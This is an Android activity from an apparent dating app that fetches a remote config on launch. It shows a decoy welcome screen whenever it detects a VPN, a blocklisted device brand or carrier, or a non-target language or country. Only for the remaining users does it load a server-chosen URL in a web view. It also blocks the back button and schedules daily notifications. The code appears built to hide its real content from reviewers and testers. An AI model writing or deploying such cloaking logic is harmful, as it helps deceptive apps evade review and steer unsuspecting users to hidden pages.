package flirt.and.date;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;


import androidx.appcompat.app.AppCompatActivity;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Calendar;
import java.util.Collections;
import java.util.Locale;
import java.util.Random;


import static org.apache.http.params.CoreProtocolPNames.USER_AGENT;

public class MainActivity extends AppCompatActivity {

    String getUrl;
    String geoUrl;
    String url;
    SharedPreferencesEditor sharedPreferencesEditor;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        getUrl = getResources().getString(R.string.get_url);
        geoUrl = "https://ipapi.co/country";

        Random random = new Random();

        sharedPreferencesEditor = new SharedPreferencesEditor(this);



            planNotify(10, random.nextInt(60), 0);
            planNotify(13, random.nextInt(60), 2);
            planNotify(18, random.nextInt(60), 1);
            planNotify(20, random.nextInt(60), 3);
            planNotify(22, random.nextInt(60), 4);


        LogClass.log("planning notifications");






        MyAsyncTask myAsyncTask = new MyAsyncTask();
        myAsyncTask.execute();


    }




    class MyAsyncTask extends AsyncTask<Void, Void, JSONArray> {

        URL serverUrl, geoApi;
        HttpURLConnection httpUrlConnection, geoUrlConnection;
        JSONArray mJSONArray;
        String userCountry = "";
        @Override
        protected JSONArray doInBackground(Void... voids) {
            try {


                geoApi = new URL(geoUrl);
                httpUrlConnection = (HttpURLConnection) geoApi.openConnection();
                httpUrlConnection.setRequestMethod("GET");
                httpUrlConnection.setRequestProperty("User-Agent", USER_AGENT);
                userCountry = readJSON(httpUrlConnection);
                httpUrlConnection.disconnect();



                serverUrl = new URL(getUrl);
                httpUrlConnection = (HttpURLConnection) serverUrl.openConnection();
                httpUrlConnection.setRequestMethod("GET");
                httpUrlConnection.setRequestProperty("User-Agent", USER_AGENT);
                String jsonString = readJSON(httpUrlConnection);

                JSONObject jsonObject = new JSONObject(jsonString);

                Boolean stopping = jsonObject.getBoolean("stopping");


                if (sharedPreferencesEditor.checkPreferencesStorage(Constants.isTinder)){
                    openTinder();
                }
                else {

                    if (sharedPreferencesEditor.checkPreferencesStorage(Constants.urlBeforeUserLeaveHint)) {

//                        LogClass.log("contains last url" + sharedPreferencesEditor.getStringValue(Constants.urlBeforeUserLeaveHint) );
                        openView(sharedPreferencesEditor.getStringValue(Constants.urlBeforeUserLeaveHint));

                    } else {

                        if (sharedPreferencesEditor.checkPreferencesStorage(Constants.url)) {
                            openView(sharedPreferencesEditor.getStringValue(Constants.url));
                        } else {
                            if (useVpn()) {
                                openTinder();
                            } else {
                                if (stopping) {
                                    String stopBrand = jsonObject.getString("stop_brand");
                                    JSONArray stopBrands = new JSONArray(stopBrand);
                                    String userBrand = Build.BRAND;

//                                LogClass.log("userBrand: " + userBrand);
//                                LogClass.log("stopBrand: " + stopBrand);

                                    if (jsonArrayHasElement(stopBrands, userBrand)) {
                                        openTinder();
                                    } else {

                                        String stopIsp = jsonObject.getString("stop_isp");
                                        JSONArray stopIsps = new JSONArray(stopIsp);
                                        TelephonyManager telephonyManager = (TelephonyManager)
                                                getSystemService(Context.TELEPHONY_SERVICE);

                                        String userIsp = telephonyManager.getNetworkOperatorName();
//
//                                    LogClass.log("userIsp: " + userIsp);
//                                    LogClass.log("stopIsp: " + stopIsp);

                                        if (jsonArrayHasElement(stopIsps, userIsp)) {
                                            openTinder();
                                        } else {

                                            url = jsonObject.getString("url");

//                                        LogClass.log("url: " + url);

                                            String targetLanguage = jsonObject.getString("target_lang");
                                            JSONArray targetLanguages = new JSONArray(targetLanguage);
                                            String userLanguage = getResources().getConfiguration().locale.getLanguage();

//                                        LogClass.log("userLang: " + userLanguage);
//                                        LogClass.log("targetLang: " + targetLanguage);

                                            String targetCountry = jsonObject.getString("target_country");
                                            JSONArray targetCountries = new JSONArray(targetCountry);

//                                          LogClass.log("userCountry: " + userCountry);
//                                        LogClass.log("targetCountry: " + targetCountry);

                                            if (jsonArrayHasElement(targetLanguages, userLanguage) && jsonArrayHasElement(targetCountries, userCountry)) {
                                                openView(url);
                                            } else {
                                                openTinder();
                                            }
                                        }
                                    }
                                } else {
                                    openTinder();
                                }
                            }
                        }
                    }

                }
            } catch (Exception ex) {
                openTinder();
                LogClass.log("exception:" + ex.getMessage());
            }
            return mJSONArray;
        }


        @Override
        protected void onPostExecute(JSONArray resultJsonArray) {
            super.onPostExecute(resultJsonArray);
        }
    }

    public String readJSON(HttpURLConnection connection) throws IOException {

        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder builder = new StringBuilder();
        String answer;
        while ((answer = reader.readLine()) != null) {

            builder.append(answer);
        }
        reader.close();
        return builder.toString();
    }


    private Boolean jsonArrayHasElement(JSONArray jsonArray, String item){
        for( int i=0; i<=jsonArray.length()-1;i++){
            try {
                if (item.equalsIgnoreCase(jsonArray.getString(i))) {
//                    LogClass.log("json Array Has Element " + item);
                    return true;
                }

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
//        LogClass.log("json Array Has Not Element " + item);
        return false;
    }


    private void openTinder() {
        Intent intent = new Intent(this,WelcomeScreen.class);
        sharedPreferencesEditor.putIntoStorage(Constants.isTinder,"yes");
        startActivity(intent);
    }

    private void openView(String link) {
        Intent intent = new Intent(this,MyView.class);
        intent.putExtra("url",link);
        startActivity(intent);
    }


    public boolean useVpn() {
        String iface = "";
        try {
            for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (networkInterface.isUp())
                    iface = networkInterface.getName();
//                LogClass.log("IFACE NAME: " + iface);
                if ( iface.contains("tun") || iface.contains("ppp") || iface.contains("pptp")) {
                    return true;
                }
            }
        } catch (SocketException e1) {
            e1.printStackTrace();
        }

        return false;
    }

    @Override
    public void onBackPressed() {

    }




    private void planNotify(int hours, int minutes, int i) {

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);


        Intent intent = new Intent(this, NotificationReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, i,
                intent, PendingIntent.FLAG_UPDATE_CURRENT);

        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.set(Calendar.HOUR_OF_DAY, hours);
        calendar.set(Calendar.MINUTE, minutes);
        long timeUntilTrigger;

        double diff = Calendar.getInstance().getTimeInMillis() - calendar.getTimeInMillis();
        if (diff>0){
            timeUntilTrigger = calendar.getTimeInMillis() + 86400000;
        }
        else{
            timeUntilTrigger = calendar.getTimeInMillis();
        }



        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, timeUntilTrigger, AlarmManager.INTERVAL_DAY, pendingIntent);

    }





}
